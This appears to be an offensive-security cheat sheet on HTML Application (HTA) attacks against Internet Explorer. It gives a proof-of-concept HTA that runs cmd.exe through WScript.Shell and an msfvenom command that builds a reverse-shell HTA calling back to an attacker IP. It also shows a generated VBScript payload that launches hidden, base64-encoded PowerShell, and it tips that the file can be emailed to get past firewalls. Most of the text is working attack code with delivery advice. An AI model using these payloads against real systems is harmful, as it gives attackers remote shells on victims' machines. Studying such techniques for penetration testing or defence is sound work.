## HTML Application (HTA) Attacks

### Internet Explorer/Edge

Simple PoC code to launch a command using a Windows Script Host Shell object.

```html
<html>
<body>
<script>
    // Run cmd.exe
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);    
</script>
</body>
<body>
<script>self.close();</script>
</body>    
</html>
```

Use Powershell to perform more sophisticated attacks:

```bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=80 -f hta-psh -o /var/www/html/evil.hta

# Options
-f hta-psh 	# Format for HTA files
```

This will generate a payload similiar to this one:

```html
<script language="VBScript">
    window.moveTo -4000,-4000
    Set yiH = CreateObject("Wscript.Shell")
    Set fx9uBRqUjGQ5 = CreateObject("Scripting.FileSystemObject")
    For each path in Split(yiH.ExpandEnvironmentStrings("%PSModulePath%"),";")
	    If fx9uBRqUjGQ5.FileExists(path + "\..\powershell.exe") Then
    		yiH.Run "powershell.exe -nop -w hidden -e 
-----SNIPPED-------
	    	//-nop = no profile, does not load user profile
    		//-w hidden	= Window style: hidden to avoid creating window on desktop
    		//-e <base64> = Supplies Powershell command as Base64 encoded argument
```

Once a user executes this in Internet Explorer, a reverse shell will be established with the attacker machine.  This can be exploited without utilizing a vulnerability.  Users can browse to the page or the file can be sent through email as well to bypass Firewalls.

